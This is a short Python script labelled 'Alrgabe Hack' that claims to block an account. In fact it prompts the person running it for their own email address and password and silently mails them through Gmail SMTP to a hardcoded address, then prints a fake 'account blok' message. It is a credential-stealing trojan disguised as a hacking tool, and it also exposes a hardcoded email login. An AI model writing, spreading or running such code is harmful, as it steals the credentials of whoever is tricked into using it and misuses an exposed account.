import smtplib
import time

print('Alrgabe Hack')
    


frome = 'dkild996@gmail.com'

pas = '0919959525'

to = 'dkild996@gmail.com'



msg = input('\n\n===>Enter you Email : ')+ input('\n\n===>Enter password Email : ')

input('\n===>Enter url account : ')

    


try:
    ser = smtplib.SMTP_SSL('smtp.gmail.com')

    ser.login(frome , pas)
    
    ser.sendmail(frome , to , msg )
    
    ser.quit()
    
    print('plise withe...')
    time.sleep(5)
    print('account blok#')
except:
    print('error')




